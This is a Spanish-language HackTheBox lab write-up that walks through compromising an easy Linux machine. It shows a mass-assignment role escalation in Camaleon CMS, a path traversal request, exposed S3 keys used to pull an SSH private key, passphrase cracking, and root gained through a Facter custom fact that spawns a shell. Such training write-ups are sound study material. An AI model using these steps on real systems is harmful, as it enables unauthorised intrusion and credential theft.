**Plataforma:** HackTheBox  
**Dificultad:** Easy  
**OS:** Linux  
**Temporada:** Season 10 — Underground  
**Fecha de resolución:** 18/06/2026  

---

## Índice

1. [Reconocimiento](#reconocimiento)
2. [Enumeración Web](#enumeración-web)
3. [Acceso al Panel Admin — Broken Access Control](#acceso-al-panel-admin--broken-access-control)
4. [Escalada de Rol — CVE-2025-2304 (Mass Assignment)](#escalada-de-rol--cve-2025-2304-mass-assignment)
5. [Path Traversal — CVE-2024-46987](#path-traversal--cve-2024-46987)
6. [Credenciales S3 y Bucket MinIO](#credenciales-s3-y-bucket-minio)
7. [Obtención de Shell — SSH](#obtención-de-shell--ssh)
8. [Escalada de Privilegios — Sudo + Facter](#escalada-de-privilegios--sudo--facter)
9. [Flags](#flags)
10. [Lecciones aprendidas](#lecciones-aprendidas)

---

## Reconocimiento

Se comienza con un escaneo Nmap para identificar los servicios expuestos en la máquina:

```bash
nmap -p22,80,54321 -sCV 10.129.244.96 -oN escaneo
```

**Resultados:**

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 9.9p1 Ubuntu |
| 80/tcp | HTTP | nginx 1.26.3 |
| 54321/tcp | HTTP | MinIO (S3-compatible) |

El puerto 80 redirige a `http://facts.htb/`, por lo que se agrega el hostname al archivo `/etc/hosts`:

```bash
echo "10.129.244.96 facts.htb" | sudo tee -a /etc/hosts
```

El puerto 54321 expone una instancia de **MinIO**, un servidor de almacenamiento de objetos compatible con la API de AWS S3. Su presencia es una pista importante para etapas posteriores.

---

## Enumeración Web

Al visitar `http://facts.htb` se encuentra un sitio de trivia con un panel de login. Se realiza fuzzing de directorios para descubrir rutas ocultas:

```bash
gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,rb -t 40
```

El fuzzing revela que las rutas `/admin`, `/admin.html`, `/admin.php` y `/admin.rb` redirigen a `/admin/login`. Esto confirma la existencia de un panel administrativo.

En la página principal se observa además que el CMS usado es **Camaleon CMS**, desarrollado en Ruby on Rails. La versión exacta (2.9.0) se muestra en el pie de página del panel admin.

---

## Acceso al Panel Admin — Broken Access Control

El formulario de login incluye la opción **"Create an account"**. Al registrarse con cualquier usuario, el sistema otorga acceso al panel admin sin requerir ningún tipo de validación o aprobación previa.

**Vulnerabilidad:** Broken Access Control (OWASP A01). El endpoint de registro no restringe la creación de cuentas con acceso al dashboard administrativo.

Tras registrarse e iniciar sesión, se accede al dashboard en `/admin/dashboard`. Sin embargo, el rol asignado es **Client**, lo que limita las funcionalidades disponibles.

---

## Escalada de Rol — CVE-2025-2304 (Mass Assignment)

Revisando el perfil del usuario en `/admin/profile/edit`, se puede cambiar la contraseña. Esta funcionalidad es vulnerable a **mass assignment** debido al uso de `permit!` en el controlador Rails:

```ruby
def updated_ajax
  @user = current_site.users.find(params[:user_id])
  @user.update(params.require(:password).permit!)
  render inline: @user.errors.full_messages.join(', ')
end
```

En Rails, `permit!` desactiva el filtrado de parámetros (strong parameters), permitiendo que cualquier atributo del modelo sea modificado desde la request, incluyendo el atributo `role`.

**Explotación con Burp Suite:**

Se intercepta el POST de cambio de contraseña y se agrega el parámetro:

```
password[role]=admin
```

El body completo de la request modificada queda así:

```
password[password]=nuevapass&password[password_confirmation]=nuevapass&password[role]=admin
```

Tras reenviar la request, cerrar sesión y volver a entrar, el rol del usuario es ahora **Administrator**, con acceso completo al panel.

---

## Path Traversal — CVE-2024-46987

Camaleon CMS 2.9.0 es vulnerable a path traversal en el endpoint de descarga de archivos privados. El parámetro `file` no es sanitizado correctamente, permitiendo salir del directorio raíz de la aplicación y leer archivos arbitrarios del sistema.

```
GET /admin/media/download_private_file?file=../../../../../../etc/passwd
```

Se utiliza el exploit público disponible en ExploitDB (EDB-52531):

```bash
searchsploit Camaleon CMS v2.9.0
python3 /usr/share/exploitdb/exploits/multiple/webapps/52531.py
```

**Verificación con `/etc/passwd`:**

```
root:x:0:0:root:/root:/bin/bash
...
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

Se identifican dos usuarios con shell bash: `trivia` y `william`.

**Descubrimiento de la ruta nginx:**

Usando el path traversal se lee la configuración de nginx:

```bash
# Archivo: /etc/nginx/sites-enabled/facts.htb
```

Esto revela que existe un bucket MinIO con nombre `randomfacts` y que el endpoint S3 corre en `localhost:54321`. También confirma la existencia de una ruta `/randomfacts/` expuesta via proxy.

---

## Credenciales S3 y Bucket MinIO

Con acceso de administrador al CMS, se navega a **Settings → General Site → Filesystem Settings**. Allí se encuentran las credenciales de S3 expuestas en texto plano:

| Campo | Valor |
|-------|-------|
| Access Key | `AKIA808EABB9D1A6004E` |
| Secret Key | `rjxRREFBuYvEms6Mumqo23lYMq47WZX2ab4+D5kp` |
| Bucket | `randomfacts` |
| Endpoint | `http://localhost:54321` |

**Vulnerabilidad:** Las credenciales de acceso a la infraestructura de almacenamiento están almacenadas en texto plano y son visibles para cualquier usuario con acceso al panel de configuración. En entornos reales se deben usar IAM roles o secrets managers.

Se configura el cliente AWS CLI con un perfil dedicado:

```bash
aws configure --profile facts
# Access Key: AKIA808EABB9D1A6004E
# Secret Key: rjxRREFBuYvEms6Mumqo23lYMq47WZX2ab4+D5kp
# Region: us-east-1
```

Se listan todos los buckets disponibles:

```bash
aws --profile facts --endpoint-url=http://facts.htb:54321 s3 ls
```

Resultado:
```
2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts
```

El bucket `internal` no es el bucket configurado en el CMS — es un hallazgo inesperado. Al explorarlo:

```bash
aws --profile facts --endpoint-url=http://facts.htb:54321 s3 ls s3://internal/
```

```
PRE .bundle/
PRE .cache/
PRE .ssh/
    .bash_logout
    .bashrc
    .lesshst
    .profile
```

El bucket `internal` contiene lo que parece ser el **home directory de un usuario sincronizado con S3**. El directorio `.ssh/` contiene una clave privada:

```bash
aws --profile facts --endpoint-url=http://facts.htb:54321 s3 ls s3://internal/.ssh/
# authorized_keys
# id_ed25519

aws --profile facts --endpoint-url=http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519
chmod 600 id_ed25519
```

---

## Obtención de Shell — SSH

Al intentar conectarse con la clave descargada, se detecta que está protegida con passphrase. Se procede a crackearla con John the Ripper:

```bash
ssh2john id_ed25519 > id_ed25519.hash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
john id_ed25519.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Passphrase encontrada:** `dragonballz`

Se establece la conexión SSH como el usuario `trivia`:

```bash
ssh -i id_ed25519 trivia@10.129.244.96
# passphrase: dragonballz
```

La flag de usuario se encuentra en el home de `william`:

```bash
find / -name user.txt 2>/dev/null
cat /home/william/user.txt
```

---

## Escalada de Privilegios — Sudo + Facter

Se verifica qué comandos puede ejecutar `trivia` con sudo:

```bash
sudo -l
```

```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

**¿Qué es Facter?**  
Facter es una herramienta de Puppet que recopila información del sistema ("facts"). Soporta **custom facts escritos en Ruby** que se cargan desde directorios externos mediante el flag `--custom-dir`.

**Vulnerabilidad:** Otorgar `sudo` sobre `facter` es equivalente a dar acceso root irrestricto, ya que permite ejecutar código Ruby arbitrario con privilegios elevados.

**Explotación:**

Se crea un custom fact malicioso en Ruby en `/tmp`:

```bash
cd /tmp
nano exploit.rb
```

Contenido de `exploit.rb`:

```ruby
Facter.add(:anything) do
  setcode do
    system("/bin/bash -p")
  end
end
```

Se ejecuta facter apuntando al directorio `/tmp` como fuente de facts externos:

```bash
sudo /usr/bin/facter --custom-dir /tmp anything
```

Facter carga el archivo Ruby, ejecuta el bloque `setcode`, y como el proceso corre como root, se obtiene una shell privilegiada:

```
root@facts:/tmp# whoami
root
```

